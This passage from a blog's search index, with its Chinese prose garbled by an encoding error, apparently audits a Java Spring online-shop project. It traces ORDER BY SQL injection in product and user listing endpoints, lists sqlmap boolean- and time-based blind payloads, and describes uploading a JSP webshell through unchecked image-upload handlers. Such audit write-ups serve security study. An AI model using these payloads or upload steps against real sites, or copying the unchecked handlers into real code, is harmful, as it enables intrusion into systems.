selectOne(@Param(&quot;user_id&quot;) Integer user_id); User selectByLogin(@Param(&quot;user_name&quot;) String user_name, @Param(&quot;user_password&quot;) String user_password); Integer selectTotal(@Param(&quot;user&quot;) User user);} ç„¶åæ¥ç€cmd+Bï¼Œæ‰¾è°å®ç°äº†select @Overridepublic List&lt;User&gt; getList(User user, OrderUtil orderUtil, PageUtil pageUtil) { return userMapper.select(user,orderUtil,pageUtil);} å†find usagesæ‰¾è°è°ƒç”¨äº†è¿™ä¸ªgetList æœ‰ä¸¤å¤„ä½†æ˜¯goUserManagePageä¸­çš„getListï¼Œå®ƒä¼ å…¥çš„orderUtilä¸ºnull public String goUserManagePage(HttpSession session, Map&lt;String, Object&gt; map){ logger.info(&quot;è·å–å‰åæ¡ç”¨æˆ·ä¿¡æ¯&quot;); PageUtil pageUtil = new PageUtil(0, 10); List&lt;User&gt; userList = userService.getList(null, null, pageUtil); ... æˆ‘ä»¬çœ‹ä¸‹é¢ä¸€å¤„ OrderUtil orderUtil = null;if (orderBy != null) { logger.info(&quot;æ ¹æ®{}æ’åºï¼Œæ˜¯å¦å€’åº:{}&quot;,orderBy,isDesc); orderUtil = new OrderUtil(orderBy, isDesc);}JSONObject object = new JSONObject();logger.info(&quot;æŒ‰æ¡ä»¶è·å–ç¬¬{}é¡µçš„{}æ¡ç”¨æˆ·&quot;, index + 1, count);PageUtil pageUtil = new PageUtil(index, count);List&lt;User&gt; userList = userService.getList(user, orderUtil, pageUtil); orderByå’ŒisDescåœ¨Urlä¸­ä¼ å…¥ï¼Œæˆ‘ä»¬å¯æ§ @RequestParam(required = false) String orderBy/* æ’åºå­—æ®µ */,@RequestParam(required = false,defaultValue = &quot;true&quot;) Boolean isDesc/* æ˜¯å¦å€’åº */, é™¤äº†è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬æŒ‰ç…§åŒæ ·çš„åŠæ³•ï¼Œå¯ä»¥æ‰¾åˆ°åå°è¿˜æœ‰ä¸ªäº§å“æŸ¥è¯¢ä¹Ÿå­˜åœ¨ç›¸åŒçš„æ³¨å…¥ //æŒ‰æ¡ä»¶æŸ¥è¯¢äº§å“-ajax @ResponseBody @RequestMapping(value = &quot;admin/product/{index}/{count}&quot;, .... OrderUtil orderUtil = null; if (orderBy != null) { logger.info(&quot;æ ¹æ®{}æ’åºï¼Œæ˜¯å¦å€’åº:{}&quot;,orderBy,isDesc); orderUtil = new OrderUtil(orderBy, isDesc); } JSONObject object = new JSONObject(); logger.info(&quot;æŒ‰æ¡ä»¶è·å–ç¬¬{}é¡µçš„{}æ¡äº§å“&quot;, index + 1, count); PageUtil pageUtil = new PageUtil(index, count); List&lt;Product&gt; productList = productService.getList(product, product_isEnabled_array, orderUtil, pageUtil); ---Parameter: #1* (URI) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: http://localhost:8088/tmall/admin/product/0/10?product_name=1&amp;category_id=0&amp;product_sale_price=&amp;product_price=&amp;product_isEnabled_array=0&amp;product_isEnabled_array=1&amp;product_isEnabled_array=2&amp;orderBy=(SELECT (CASE WHEN (8468=8468) THEN '' ELSE (SELECT 2634 UNION SELECT 5782) END))&amp;isDesc=true Type: time-based blind Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace Payload: http://localhost:8088/tmall/admin/product/0/10?product_name=1&amp;category_id=0&amp;product_sale_price=&amp;product_price=&amp;product_isEnabled_array=0&amp;product_isEnabled_array=1&amp;product_isEnabled_array=2&amp;orderBy=(CASE WHEN (7841=7841) THEN SLEEP(5) ELSE 7841 END)&amp;isDesc=true--- è¿˜æœ‰ä¸€ä¸ªå‰å°çš„æ³¨å…¥ï¼Œåœ¨æŸ¥è¯¢äº§å“å¤„ï¼ŒåŸç†ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯è¿™ä¸ªåªèƒ½è·‘æ—¶é—´ç›²æ³¨ã€‚ @RequestMapping(value = &quot;product/{index}/{count}&quot;, method = RequestMethod.GET) public String searchProduct(HttpSession session, Map&lt;String, Object&gt; map, @PathVariable(&quot;index&quot;) Integer index/* é¡µæ•° */, @PathVariable(&quot;count&quot;) Integer count/* è¡Œæ•°*/, @RequestParam(value = &quot;category_id&quot;, required = false) Integer category_id/* åˆ†ç±»ID */, @RequestParam(value = &quot;product_name&quot;, required = false) String product_name/* äº§å“åç§° */, @RequestParam(required = false) String orderBy/* æ’åºå­—æ®µ */, @RequestParam(required = false, defaultValue = &quot;true&quot;) Boolean isDesc/* æ˜¯å¦å€’åº */) { logger.info(&quot;æ•´åˆæœç´¢ä¿¡æ¯&quot;); Product product = new Product(); OrderUtil orderUtil = null; String searchValue = null; Integer searchType = null; if (category_id != null) { product.setProduct_category(new Category().setCategory_id(category_id)); searchType = category_id; } if (product_name != null) { product.setProduct_name(product_name); } if (orderBy != null) { logger.info(&quot;æ ¹æ®{}æ’åºï¼Œæ˜¯å¦å€’åº:{}&quot;, orderBy, isDesc); orderUtil = new OrderUtil(orderBy, isDesc); } ... ...productList = productService.getList(product, new Byte[]{0, 2}, orderUtil, pageUtil);---Parameter: orderBy (GET) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: orderBy=product_create_date AND (SELECT 8418 FROM (SELECT(SLEEP(5)))igIE)&amp;isDesc=true&amp;category_id=--- ä»»æ„æ–‡ä»¶ä¸Šä¼ springbootä¸­å¦‚æœéœ€è¦å¯¹jspè¿›è¡Œè§£æï¼Œå°±è¦å¼•å…¥ç›¸å…³ä¾èµ–ï¼Œå¯¹äºä¸€äº›springbooté¡¹ç›®ä¸­ï¼Œæ˜¯ä¸éœ€è¦jspè§£æçš„ï¼Œæ‰€ä»¥ä¸Šä¼ jspğŸå°±æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œæ°å¥½æœ‰ &lt;!-- Jsp compatible--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.taglibs&lt;/groupId&gt; &lt;artifactId&gt;taglibs-standard-impl&lt;/artifactId&gt; &lt;version&gt;1.2.5&lt;/version&gt; &lt;/dependency&gt; æˆ‘ä»¬åœ¨ä¹‹å‰çš„log4jä¸­ä¹Ÿå‘ç°äº†æœ‰å¤´åƒä¸Šä¼ ç‚¹ï¼Œå…¨å±€æœuploadï¼Œä¹Ÿå‘ç°è¿™é‡Œï¼Œæ‰€ä»¥å°±å…ˆçœ‹åˆ°è¿™ä¸ªåœ°æ–¹ @ResponseBody@RequestMapping(value = &quot;admin/uploadAdminHeadImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=UTF-8&quot;)public String uploadAdminHeadImage(@RequestParam MultipartFile file, HttpSession session) { String originalFileName = file.getOriginalFilename(); logger.info(&quot;è·å–å›¾ç‰‡åŸå§‹æ–‡ä»¶åï¼š{}&quot;, originalFileName); assert originalFileName != null; String extension = originalFileName.substring(originalFileName.lastIndexOf('.')); //ç”Ÿæˆéšæœºå String fileName = UUID.randomUUID() + extension; //è·å–ä¸Šä¼ è·¯å¾„ String filePath = session.getServletContext().getRealPath(&quot;/&quot;) + &quot;res/images/item/adminProfilePicture/&quot; + fileName; logger.info(&quot;æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼š{}&quot;, filePath); JSONObject jsonObject = new JSONObject(); try { logger.info(&quot;æ–‡ä»¶ä¸Šä¼ ä¸­...&quot;); file.transferTo(new File(filePath)); logger.info(&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;); jsonObject.put(&quot;success&quot;, true); jsonObject.put(&quot;fileName&quot;, fileName); } catch (IOException e) { logger.warn(&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;); e.printStackTrace(); jsonObject.put(&quot;success&quot;, false); } return jsonObject.toJSONString();} å¯ä»¥å‘ç°ä»–å¹¶æ²¡æœ‰å¯¹åç¼€ï¼Œå†…å®¹å•¥çš„åšä»»ä½•é™åˆ¶ï¼Œè·å–æ–‡ä»¶è·¯å¾„åå°±ç›´æ¥ä¸Šä¼ äº†ï¼Œè€Œä¸”è¿‡æ»¤å™¨ä¸­ä¹Ÿæ²¡æœ‰ä¹Ÿæ²¡æœ‰ç›¸å…³è¿‡æ»¤ã€‚ åªæœ‰å‰ç«¯å¯¹åç¼€åšäº†é™åˆ¶ï¼Œä½†æ˜¯ç­‰äºæ²¡åšï¼Œç›´æ¥æŠŠacceptåˆ äº†å°±è¡Œï¼Œç›´æ¥ä¸Šä¼ jspğŸ åœ¨æµè§ˆå™¨ä¸­ç”¨f12æŸ¥çœ‹å›¾ç‰‡è·¯å¾„ï¼Œæ‹¼æ¥ä¸Šæ–‡ä»¶åç›´æ¥è¿æ¥ è¿™ä¸ªæ˜¯åå°çš„ä¸Šä¼ ï¼Œç›¸åŒçš„åœ°æ–¹ç®€å•çœ‹äº†ä¸‹åº”è¯¥è¿˜æœ‰è¿™äº›åœ°æ–¹ admin/uploadCategoryImageadmin/uploadProductImageuser/uploadUserHeadImage ä¸Šä¼ æ–‡ä»¶ä»£ç åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ã€‚","link":"/2023/03/28/tmall/"}],"tags":[],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"JavaSecå­¦ä¹ ","slug":"JavaSecå­¦ä¹ ","link":"/categories/JavaSec%E5%AD%A6%E4%B9%A0/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"csapp","slug":"csapp","link":"/categories/csapp/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"å­¦ä¹ ","slug":"ä»£ç å®¡è®¡/å­¦ä¹ ","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AD%A6%E4%B9%A0/"},{"name":"ctf","slug":"ctf","link":"/categories/ctf/"},{"name":"å­¦ä¹ ","slug":"csapp/å­¦ä¹ ","link":"/categories/csapp/%E5%AD%A6%E4%B9%A0/"},{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","link":"/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"å­¦ä¹ ","slug":"web/å­¦ä¹ ","link":"/categories/web/%E5%AD%A6%E4%B9%A0/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Misc","slug":"Misc","link":"/categories/Misc/"},{"name":"æ¸—é€","slug":"ctf/æ¸—é€","link":"/categories/ctf/%E6%B8%97%E9%80%8F/"},{"name":"å­¦ä¹ ","slug":"pwn/å­¦ä¹ ","link":"/categories/pwn/%E5%AD%A6%E4%B9%A0/"},{"name":"å­¦ä¹ ","slug":"Misc/å­¦ä¹ ","link":"/categories/Misc/%E5%AD%A6%E4%B9%A0/"},{"name":"Go","slug":"Go","link":"/categories/Go/"},{"name":"å­¦ä¹ ","slug":"Go/å­¦ä¹ ","link":"/categories/Go/%E5%AD%A6%E4%B9%A0/"}]}